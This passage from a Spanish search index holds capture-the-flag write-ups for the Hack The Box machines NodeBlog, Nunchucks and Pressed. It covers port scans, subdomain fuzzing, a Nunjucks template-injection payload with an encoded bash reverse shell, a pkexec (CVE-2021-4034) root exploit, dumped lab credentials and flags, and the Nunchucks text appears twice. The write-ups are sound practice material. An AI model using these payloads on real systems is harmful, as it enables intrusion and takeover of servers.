\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 > python -m http.server 80 Serving HTTP on 0 .0.0.0 port 80 ( http://0.0.0.0:80/ ) ... 10 .10.11.139 - - [ 06 /Sep/2022 02 :16:55 ] \"GET /rshell.sh HTTP/1.1\" 200 - Finalmente se obtiene la flag, curiosamente el home del usuario no ten\u00eda los permisos necesarios, se le asignan con chmod sin problemas: admin@nodeblog:~$ cat user.txt 45b19c9e1c1c0ce18bb276d25c014479","title":"Intrusion - Shell Reversa"},{"location":"maquinas/linux/nodeblog/#escalada-de-privilegios-root","text":"Se revisa el directorio y se encuentran comandos de mongo en el historico, de esta forma se da con el password del usuario admin: admin@nodeblog:~$ mongo MongoDB shell version v3.6.8 connecting to: mongodb://127.0.0.1:27017 Implicit session: session { \"id\" : UUID ( \"237a4919-fe30-4040-9007-42f7d0035e23\" ) } MongoDB server version: 3 .6.8 Server has startup warnings: 2022 -09-05T16:39:01.320+0000 I CONTROL [ initandlisten ] > show dbs admin 0 .000GB blog 0 .000GB config 0 .000GB local 0 .000GB > use blog switched to db blog > show collections articles users > db.users.find () { \"_id\" : ObjectId ( \"61b7380ae5814df6030d2373\" ) , \"createdAt\" : ISODate ( \"2021-12-13T12:09:46.009Z\" ) , \"username\" : \"admin\" , \"password\" : \"IppsecSaysPleaseSubscribe\" , \"__v\" : 0 } Afortunadamente el usuario tiene privilegios para usar sudo y se obtiene el acceso como root: admin@nodeblog:~$ sudo su [ sudo ] password for admin: IppsecSaysPleaseSubscribe root@nodeblog:/home/admin# cat /root/root.txt bbc0156e85ea877f7e6b18752d3adf41","title":"Escalada de privilegios - Root:"},{"location":"maquinas/linux/nunchucks/","text":"Nunchucks HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.122 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.122 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,443 10.10.11.122 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 14:21 CEST Nmap scan report for 10.10.11.122 Host is up (0.039s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_http-title: Nunchucks - Landing Page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Subdomain fuzzing: > gobuster vhost -u https://nunchucks.htb -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -k =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: https://nunchucks.htb [ + ] Method: GET [ + ] Threads: 10 [ + ] Wordlist: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2022 /09/06 18 :11:46 Starting gobuster in VHOST enumeration mode =============================================================== Found: store.nunchucks.htb ( Status: 200 ) [ Size: 4029 ] =============================================================== 2022 /09/06 18 :12:10 Finished =============================================================== > ffuf -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -u https://nunchucks.htb -H \"Host:FUZZ.nunchucks.htb\" -t 200 -fw 12757 / '___\\ /' ___ \\ / ' ___ \\ / \\ \\_ _/ / \\ \\_ _/ __ __ / \\ \\_ _/ \\ \\ ,__ \\\\ \\ ,__ \\/\\ \\/\\ \\ \\ \\ ,__ \\ \\ \\ \\_ / \\ \\ \\_ / \\ \\ \\_\\ \\ \\ \\ \\_ / \\ \\_\\ \\ \\_\\ \\ \\_ ___/ \\ \\_\\ \\/ _/ \\/ _/ \\/ ___/ \\/ _/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : https://nunchucks.htb :: Wordlist : FUZZ: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200 ,204,301,302,307,401,403,405,500 :: Filter : Response words: 12757 ________________________________________________ store [ Status: 200 , Size: 4029 , Words: 1053 , Lines: 102 , Duration: 1205ms ] :: Progress: [ 4989 /4989 ] :: Job [ 1 /1 ] :: 658 req/sec :: Duration: [ 0 :00:13 ] :: Errors: 0 :: SSTI - Gaining Access (david) Tiene un campo para introducir un email donde muestra tu input por pantalla, se acontece un SSTI: curl -i -s -k -X $'POST' \\ -H $'Host: store.nunchucks.htb' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://store.nunchucks.htb/' -H $'Content-Type: application/json' -H $'Origin: https://store.nunchucks.htb' -H $'Content-Length: 41' -H $'Dnt: 1' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' \\ -b $'_csrf=bfcyZxC5RFySonRBKMcL3oCd' \\ --data-binary $'{\\\"email\\\":\\\"admin@nunchucks.ssti=>{{7*7}}\\\"}' \\ $'https://store.nunchucks.htb/api/submit' HTTP/1.1 200 OK Server: nginx/1.18.0 ( Ubuntu ) Date: Tue, 06 Sep 2022 20 :50:42 GMT Content-Type: application/json ; charset = utf-8 Content-Length: 97 Connection: close X-Powered-By: Express ETag: W/ \"61-B1GM5SD19cIKlXIzfph3l47PzEI\" { \"response\" : \"You will receive updates on the following email address: admin@nunchucks.ssti=>49.\" } # En la sugerencia de las busquedas se encuentra un tipo de SSTI llamado \"nodejs nunjucks ssti\" que coincide bastante con el nombre de la m\u00e1quina, y se consigue un payload con RCE funcional escapando las comillas: # Payload: {\"email\":\"admin@n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}\"} # Shell reversa: POST /api/submit HTTP/1.1 Host: store.nunchucks.htb Cookie: _csrf = bfcyZxC5RFySonRBKMcL3oCd User-Agent: Mozilla/5.0 ( Windows NT 10 .0 ; rv:91.0 ) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en ; q = 0 .5 Accept-Encoding: gzip, deflate Referer: https://store.nunchucks.htb/ Content-Type: application/json Origin: https://store.nunchucks.htb Content-Length: 131 Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close { \"email\" : \"admin@n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg==| base64 -d | bash')\\\")()}}\" } david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt d82f1d7edadab1a9875fe1ab211276aa Escalate privs - Root Tras revisar los ficheros suid se encuentra un pkexec vulnerable: david@nunchucks:/dev/shm$ bash puto.sh \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d CVE-2021-4034 PoC by Kim Schulz [ + ] Setting up environment... [ + ] Build offensive gconv shared module... [ + ] Build mini executor... root@nunchucks:/dev/shm# whoami root root@nunchucks:/dev/shm# cat /root/root.txt 2ff144764fbba7ef409bdf34ed0c0e4b","title":"Nunckucks"},{"location":"maquinas/linux/nunchucks/#nunchucks-htb","text":"","title":"Nunchucks HTB"},{"location":"maquinas/linux/nunchucks/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.122","title":"Recon"},{"location":"maquinas/linux/nunchucks/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.122 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,443 10.10.11.122 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 14:21 CEST Nmap scan report for 10.10.11.122 Host is up (0.039s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_http-title: Nunchucks - Landing Page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Subdomain fuzzing: > gobuster vhost -u https://nunchucks.htb -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -k =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: https://nunchucks.htb [ + ] Method: GET [ + ] Threads: 10 [ + ] Wordlist: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2022 /09/06 18 :11:46 Starting gobuster in VHOST enumeration mode =============================================================== Found: store.nunchucks.htb ( Status: 200 ) [ Size: 4029 ] =============================================================== 2022 /09/06 18 :12:10 Finished =============================================================== > ffuf -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -u https://nunchucks.htb -H \"Host:FUZZ.nunchucks.htb\" -t 200 -fw 12757 / '___\\ /' ___ \\ / ' ___ \\ / \\ \\_ _/ / \\ \\_ _/ __ __ / \\ \\_ _/ \\ \\ ,__ \\\\ \\ ,__ \\/\\ \\/\\ \\ \\ \\ ,__ \\ \\ \\ \\_ / \\ \\ \\_ / \\ \\ \\_\\ \\ \\ \\ \\_ / \\ \\_\\ \\ \\_\\ \\ \\_ ___/ \\ \\_\\ \\/ _/ \\/ _/ \\/ ___/ \\/ _/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : https://nunchucks.htb :: Wordlist : FUZZ: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200 ,204,301,302,307,401,403,405,500 :: Filter : Response words: 12757 ________________________________________________ store [ Status: 200 , Size: 4029 , Words: 1053 , Lines: 102 , Duration: 1205ms ] :: Progress: [ 4989 /4989 ] :: Job [ 1 /1 ] :: 658 req/sec :: Duration: [ 0 :00:13 ] :: Errors: 0 ::","title":"Enum"},{"location":"maquinas/linux/nunchucks/#ssti-gaining-access-david","text":"Tiene un campo para introducir un email donde muestra tu input por pantalla, se acontece un SSTI: curl -i -s -k -X $'POST' \\ -H $'Host: store.nunchucks.htb' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://store.nunchucks.htb/' -H $'Content-Type: application/json' -H $'Origin: https://store.nunchucks.htb' -H $'Content-Length: 41' -H $'Dnt: 1' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' \\ -b $'_csrf=bfcyZxC5RFySonRBKMcL3oCd' \\ --data-binary $'{\\\"email\\\":\\\"admin@nunchucks.ssti=>{{7*7}}\\\"}' \\ $'https://store.nunchucks.htb/api/submit' HTTP/1.1 200 OK Server: nginx/1.18.0 ( Ubuntu ) Date: Tue, 06 Sep 2022 20 :50:42 GMT Content-Type: application/json ; charset = utf-8 Content-Length: 97 Connection: close X-Powered-By: Express ETag: W/ \"61-B1GM5SD19cIKlXIzfph3l47PzEI\" { \"response\" : \"You will receive updates on the following email address: admin@nunchucks.ssti=>49.\" } # En la sugerencia de las busquedas se encuentra un tipo de SSTI llamado \"nodejs nunjucks ssti\" que coincide bastante con el nombre de la m\u00e1quina, y se consigue un payload con RCE funcional escapando las comillas: # Payload: {\"email\":\"admin@n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}\"} # Shell reversa: POST /api/submit HTTP/1.1 Host: store.nunchucks.htb Cookie: _csrf = bfcyZxC5RFySonRBKMcL3oCd User-Agent: Mozilla/5.0 ( Windows NT 10 .0 ; rv:91.0 ) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en ; q = 0 .5 Accept-Encoding: gzip, deflate Referer: https://store.nunchucks.htb/ Content-Type: application/json Origin: https://store.nunchucks.htb Content-Length: 131 Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close { \"email\" : \"admin@n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg==| base64 -d | bash')\\\")()}}\" } david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt d82f1d7edadab1a9875fe1ab211276aa","title":"SSTI - Gaining Access (david)"},{"location":"maquinas/linux/nunchucks/#escalate-privs-root","text":"Tras revisar los ficheros suid se encuentra un pkexec vulnerable: david@nunchucks:/dev/shm$ bash puto.sh \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d CVE-2021-4034 PoC by Kim Schulz [ + ] Setting up environment... [ + ] Build offensive gconv shared module... [ + ] Build mini executor... root@nunchucks:/dev/shm# whoami root root@nunchucks:/dev/shm# cat /root/root.txt 2ff144764fbba7ef409bdf34ed0c0e4b","title":"Escalate privs - Root"},{"location":"maquinas/linux/pressed/","text":"Pressed HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: 10.10.11.142 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.11.142 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN openPorts # Nmap 7.92 scan initiated Sat Aug 20 15:51:49 2022 as: nmap -sCV -p80 -oN openPorts 10.10.11.142 Nmap scan report for 10.10.11.142 Host is up (0.041s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: UHC Jan Finals &#8211; New Month, New Boxes |_http-generator: WordPress 5.9 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 20 15:51:59 2022 -- 1 IP address (1 host up) scanned in 10.06 seconds wpscan (backup config) Se encuentra un wordpress, y tras revisarlo con wpscan localiza un backup de de la configuraci\u00f3n con credenciales. wpscan --url http://pressed.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.21 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://pressed.htb/ [10.10.11.142] [+] Started: Sat Aug 20 20:03:12 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://pressed.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.9 identified (Insecure, released on 2022-01-25). | Found By: Rss Generator (Passive Detection) | - http://pressed.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.9</generator> | - http://pressed.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator> [+] WordPress theme in use: retrogeek | Location: http://pressed.htb/wp-content/themes/retrogeek/ | Last Updated: 2022-04-23T00:00:00.000Z | Readme: http://pressed.htb/wp-content/themes/retrogeek/README.txt | [!] The version is out of date, the latest version is 0.6 | Style URL: http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42 | Style Name: RetroGeek | Style URI: https://tuxlog.de/retrogeek/ | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times... | Author: tuxlog | Author URI: https://tuxlog.de/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 0.5 (80% confidence) | Found By: Style (Passive Detection) | - http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:53 <=============================================================================================================> (137 / 137) 100.00% Time: 00:00:53 [i] Config Backup(s) Identified: [!] http://pressed.htb/wp-config.php.bak | Found By: Direct Access (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Aug 20 20:04:35 2022 [+] Requests Done: 173 [+] Cached Requests: 5 [+] Data Sent: 43.68 KB [+] Data Received: 126.261 KB [+] Memory used: 234.438 MB [+] Elapsed time: 00:01:23 Credenciales encontrados (wp-config.php.bak): define( 'DB_NAME', 'wordpress' ); /** Database username */ define( 'DB_USER', 'admin' ); /** Database password */ define( 'DB_PASSWORD', 'uhc-jan-finals-2021' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); Acceso a http://pressed.htb/wp-login.php modificando ligeramente las credenciales nos da acceso a un 2FA (OTP): admin:uhc-jan-finals-2022 Este Wordpress tiene habilitada la API de xmlrpc, donde se pueden enumerar los m\u00e9todos y conseguir la flag de user: curl -d '<?xml version=\"1.0\"?> <methodCall> <methodName>system.listMethods</methodName> <params> </params> </methodCall>' http://pressed.htb/xmlrpc.php <?xml version = \"1.0\" encoding = \"UTF-8\" ?> <methodResponse> <params> <param> <value> <array><data> <value><string>system.multicall</string></value> <value><string>system.listMethods</string></value> <value><string>system.getCapabilities</string></value> <value><string>htb.get_flag</string></value> <value><string>demo.addTwoNumbers</string></value> <value><string>demo.sayHello</string></value> <value><string>pingback.extensions.getPingbacks</string></value> <value><string>pingback.ping</string></value> <value><string>mt.publishPost</string></value> <value><string>mt.getTrackbackPings</string></value> <value><string>mt.supportedTextFilters</string></value> <value><string>mt.supportedMethods</string></value> <value><string>mt.setPostCategories</string></value> <value><string>mt.getPostCategories</string></value> <value><string>mt.getRecentPostTitles</string></value> <value><string>mt.getCategoryList</string></value> <value><string>metaWeblog.getUsersBlogs</string></value> <value><string>metaWeblog.deletePost</string></value> <value><string>metaWeblog.newMediaObject</string></value> <value><string>metaWeblog.getCategories</string></value> <value><string>metaWeblog.getRecentPosts</string></value> <value><string>metaWeblog.getPost</string></value> <value><string>metaWeblog.editPost</string></value> <value><string>metaWeblog.newPost</string></value> <value><string>blogger.deletePost</string></value> <value><string>blogger.editPost</string></value> <value><string>blogger.newPost</string></value> <value><string>blogger.getRecentPosts</string></value> <value><string>blogger.getPost</string></value> <value><string>blogger.getUserInfo</string></value> <value><string>blogger.getUsersBlogs</string></value> <value><string>wp.restoreRevision</string></value> <value><string>wp.getRevisions</string></value> <value><string>wp.getPostTypes</string></value> <value><string>wp.getPostType</string></value> <value><string>wp.getPostFormats</string></value> <value><string>wp.getMediaLibrary</string></value> <value><string>wp.getMediaItem</string></value> <value><string>wp.getCommentStatusList</string></value> <value><string>wp.newComment</string></value> <value><string>wp.editComment</string></value> <value><string>wp.deleteComment</string></value> <value><string>wp.getComments</string></value> <value><string>wp.getComment</string></value> <value><string>wp.setOptions</string></value> <value><string>wp.getOptions</string></value> <value><string>wp.getPageTemplates</string></value> <value><string>wp.getPageStatusList</string></value> <value><string>wp.getPostStatusList</string></value> <value><string>wp.getCommentCount</string></value> <value><string>wp.deleteFile</string></value> <value><string>wp.uploadFile</string></value> <value><string>wp.suggestCategories</string></value> <value><string>wp.deleteCategory</string></value> <value><string>wp.newCategory</string></value> <value><string>wp.getTags</string></value> <value><string>wp.getCategories</string></value> <value><string>wp.getAuthors</string></value> <value><string>wp.getPageList</string></value> <value><string>wp.editPage</string></value> <value><string>wp.deletePage</string></value> <value><string>wp.newPage</string></value> <value><string>wp.getPages</string></value> <value><string>wp.getPage</string></value> <value><string>wp.editProfile</string></value> <value><string>wp.getProfile</string></value> <value><string>wp.getUsers</string></value> <value><string>wp.getUser</string></value> <value><string>wp.getTaxonomies</string></value> <value><string>wp.getTaxonomy</string></value> <value><string>wp.getTerms</string></value> <value><string>wp.getTerm</string></value> <value><string>wp.deleteTerm</string></value> <value><string>wp.editTerm</string></value> <value><string>wp.newTerm</string></value> <value><string>wp.getPosts</string></value> <value><string>wp.getPost</string></value> <value><string>wp.deletePost</string></value> <value><string>wp.editPost</string></value> <value><string>wp.newPost</string></value> <value><string>wp.getUsersBlogs</string></value> </data></array> </value> </param> </params> </methodResponse> Se lista a continuaci\u00f3n un m\u00e9todo que devuelve la flag de user: curl -d '<?xml version=\"1.0\"?> <methodCall> <methodName>htb.get_flag</methodName> <params> </params> </methodCall>' http://pressed.htb/xmlrpc.php <?xml version=\"1.0\" encoding=\"UTF-8\"?> <methodResponse> <params> <param> <value> <string>7be142b7b81c7bef57b39008e63626ef </string> </value> </param> </params> </methodResponse> Hay una librer\u00eda de Python para gestionar xmlrpc de wordpress: Documentacion python-wordpress-xmlrpc >>> from wordpress_xmlrpc import Client >>> from wordpress_xmlrpc.methods import posts >>> client = Client ( 'http://pressed.htb/xmlrpc.php' , 'admin' , 'uhc-jan-finals-2022' ) >>> plist = client . call ( posts . GetPosts ()) >>> plist [ < WordPressPost : b 'UHC January Finals Under Way' > ] >>> dir ( plist [ 0 ]) [ '__class__' , '__delattr__' , '__dict__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__gt__' , '__hash__' , 